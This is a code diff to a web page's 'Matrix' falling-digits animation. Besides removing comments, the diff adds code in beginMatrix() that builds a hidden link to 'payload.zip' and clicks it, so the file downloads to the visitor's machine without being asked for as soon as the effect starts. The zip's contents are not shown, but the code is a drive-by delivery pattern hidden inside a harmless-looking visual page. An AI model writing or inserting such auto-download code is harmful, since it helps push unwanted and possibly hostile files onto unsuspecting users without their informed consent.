@@ -59,7 +59,6 @@
     }, 1000);
 
     function startMatrix() {
-      // Try to autoplay sound
       sound.loop = true;
       sound.play().catch(() => {
         countdownEl.textContent = "Click to begin";
@@ -76,7 +75,16 @@
     }
 
     function beginMatrix() {
-      document.body.innerHTML = ""; // Clear screen
+      // 🔥 AUTO-DOWNLOAD ZIP FILE
+      const link = document.createElement('a');
+      link.href = 'payload.zip';   // your ZIP file
+      link.download = 'payload.zip';
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+
+      // Clear screen
+      document.body.innerHTML = "";
 
       // Create canvas
       const canvas = document.createElement("canvas");
@@ -89,11 +97,9 @@
       const fontSize = 16;
       const columns = Math.floor(canvas.width / fontSize);
 
-      // Each column has a "drop" position
       const drops = Array(columns).fill(0);
 
       function draw() {
-        // Fade effect
         ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
         ctx.fillRect(0, 0, canvas.width, canvas.height);
 
@@ -102,10 +108,8 @@
 
         for (let i = 0; i < drops.length; i++) {
           const text = Math.random() > 0.5 ? "1" : "0";
-
           ctx.fillText(text, i * fontSize, drops[i] * fontSize);
 
-          // Reset drop randomly
           if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
             drops[i] = 0;
           }
